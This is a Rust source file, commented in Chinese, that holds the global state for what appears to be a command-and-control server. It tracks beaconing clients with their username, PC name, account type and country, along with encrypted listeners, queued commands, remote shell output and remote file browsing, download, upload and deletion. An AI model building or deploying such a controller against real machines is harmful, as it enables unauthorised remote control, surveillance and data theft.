//! 全局状态管理

use parking_lot::RwLock;
use std::collections::HashMap;
use std::sync::Arc;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use shared::messages::ClientIdentification;

/// 连接的客户端信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConnectedClient {
    pub id: String,
    pub ip_address: String,
    pub version: String,
    pub operating_system: String,
    pub account_type: String,
    pub country: String,
    pub username: String,
    pub pc_name: String,
    pub tag: String,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub beacon_interval: u64,  // 心跳间隔（秒）
}

impl ConnectedClient {
    pub fn from_identification(info: ClientIdentification, ip: String) -> Self {
        let now = Utc::now();
        Self {
            id: info.id,
            ip_address: ip,
            version: info.version,
            operating_system: info.operating_system,
            account_type: info.account_type,
            country: info.country,
            username: info.username,
            pc_name: info.pc_name,
            tag: info.tag,
            connected_at: now,
            last_seen: now,
            beacon_interval: 30,  // 默认 30 秒
        }
    }
}

/// 监听器配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerConfig {
    pub id: String,
    pub name: String,
    pub bind_address: String,
    pub port: u16,
    pub is_running: bool,
    /// 加密密钥 (hex 格式)
    pub encryption_key: String,
}

/// Shell 响应
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellResponse {
    pub client_id: String,
    pub output: String,
    pub is_error: bool,
    pub timestamp: i64,
}

/// 文件响应类型
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum FileResponse {
    DirectoryListing {
        path: String,
        entries: Vec<FileEntryInfo>,
        error: Option<String>,
    },
    FileDownload {
        path: String,
        data: Vec<u8>,
        error: Option<String>,
    },
    FileUpload {
        path: String,
        success: bool,
        error: Option<String>,
    },
    FileDelete {
        path: String,
        success: bool,
        error: Option<String>,
    },
}

/// 文件条目信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileEntryInfo {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: i64,
}

/// 应用全局状态
pub struct AppState {
    /// 连接的客户端
    pub clients: RwLock<HashMap<String, ConnectedClient>>,
    /// 监听器列表
    pub listeners: RwLock<HashMap<String, ListenerConfig>>,
    /// 待执行命令队列（client_id -> commands）
    pub pending_commands: RwLock<HashMap<String, Vec<Vec<u8>>>>,
    /// Shell 响应队列（client_id -> responses）
    pub shell_responses: RwLock<HashMap<String, Vec<ShellResponse>>>,
    /// 文件响应队列（client_id -> responses）
    pub file_responses: RwLock<HashMap<String, Vec<FileResponse>>>,
    /// 待处理的下载任务（client_id -> 下载文件路径列表）
    pub pending_downloads: RwLock<HashMap<String, Vec<String>>>,
    /// 运行中的监听器关闭信号发送器（listener_id -> shutdown sender）
    pub listener_shutdown: RwLock<HashMap<String, tokio::sync::oneshot::Sender<()>>>,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            clients: RwLock::new(HashMap::new()),
            listeners: RwLock::new(HashMap::new()),
            pending_commands: RwLock::new(HashMap::new()),
            shell_responses: RwLock::new(HashMap::new()),
            file_responses: RwLock::new(HashMap::new()),
            pending_downloads: RwLock::new(HashMap::new()),
            listener_shutdown: RwLock::new(HashMap::new()),
        }
    }
    
    /// 添加待处理的下载任务
    pub fn add_pending_download(&self, client_id: &str, path: String) {
        self.pending_downloads
            .write()
            .entry(client_id.to_string())
            .or_default()
            .push(path);
    }
    
    /// 获取下一个待处理的下载任务路径
    pub fn take_pending_download(&self, client_id: &str) -> Option<String> {
        if let Some(paths) = self.pending_downloads.write().get_mut(client_id) {
            if !paths.is_empty() {
                return Some(paths.remove(0));
            }
        }
        None
    }
    
    /// 添加客户端
    pub fn add_client(&self, client: ConnectedClient) {
        self.clients.write().insert(client.id.clone(), client);
    }
    
    /// 移除客户端
    pub fn remove_client(&self, id: &str) {
        self.clients.write().remove(id);
        self.pending_commands.write().remove(id);
    }
    
    /// 获取所有客户端
    pub fn get_clients(&self) -> Vec<ConnectedClient> {
        self.clients.read().values().cloned().collect()
    }
    
    /// 更新客户端最后在线时间
    pub fn update_last_seen(&self, id: &str) {
        if let Some(client) = self.clients.write().get_mut(id) {
            client.last_seen = Utc::now();
        }
    }
    
    /// 添加监听器
    pub fn add_listener(&self, listener: ListenerConfig) {
        self.listeners.write().insert(listener.id.clone(), listener);
    }
    
    /// 获取所有监听器
    pub fn get_listeners(&self) -> Vec<ListenerConfig> {
        self.listeners.read().values().cloned().collect()
    }
    
    /// 添加 Shell 响应
    pub fn add_shell_response(&self, response: ShellResponse) {
        let client_id = response.client_id.clone();
        self.shell_responses.write()
            .entry(client_id)
            .or_insert_with(Vec::new)
            .push(response);
    }
    
    /// 获取并清空指定客户端的 Shell 响应
    pub fn take_shell_responses(&self, client_id: &str) -> Vec<ShellResponse> {
        self.shell_responses.write()
            .remove(client_id)
            .unwrap_or_default()
    }
    
    /// 添加文件响应
    pub fn add_file_response(&self, client_id: &str, response: FileResponse) {
        self.file_responses.write()
            .entry(client_id.to_string())
            .or_insert_with(Vec::new)
            .push(response);
    }
    
    /// 获取并清空指定客户端的文件响应
    pub fn take_file_responses(&self, client_id: &str) -> Vec<FileResponse> {
        self.file_responses.write()
            .remove(client_id)
            .unwrap_or_default()
    }
    
    /// 添加待执行命令到队列
    pub fn push_command(&self, client_id: &str, command_data: Vec<u8>) {
        self.pending_commands.write()
            .entry(client_id.to_string())
            .or_insert_with(Vec::new)
            .push(command_data);
    }
    
    /// 获取并清空指定客户端的待执行命令
    pub fn take_pending_commands(&self, client_id: &str) -> Vec<Vec<u8>> {
        self.pending_commands.write()
            .remove(client_id)
            .unwrap_or_default()
    }
    
    /// 获取当前活跃监听器的加密密钥
    pub fn get_current_encryption_key(&self) -> String {
        // 返回第一个运行中的监听器的密钥
        self.listeners.read()
            .values()
            .find(|l| l.is_running)
            .map(|l| l.encryption_key.clone())
            .unwrap_or_default()
    }
}

impl Default for AppState {
    fn default() -> Self {
        Self::new()
    }
}

/// 全局状态实例
pub type SharedState = Arc<AppState>;
